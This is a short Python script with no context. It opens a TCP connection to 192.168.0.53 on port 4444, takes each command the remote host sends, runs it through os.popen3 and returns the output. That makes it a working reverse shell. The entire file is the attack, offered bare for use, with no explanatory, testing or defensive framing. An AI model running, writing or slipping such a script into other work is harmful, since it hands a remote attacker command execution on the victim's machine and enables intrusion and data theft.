import socket,os
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect(('192.168.0.53',4444))
WO=False
while not WO:
	data=so.recv(1024)
	if len(data)==0:
		WO=True
	stdin,stdout,stderr,=os.popen3(data)
	stdout_value=stdout.read()+stderr.read()
	so.send(stdout_value)
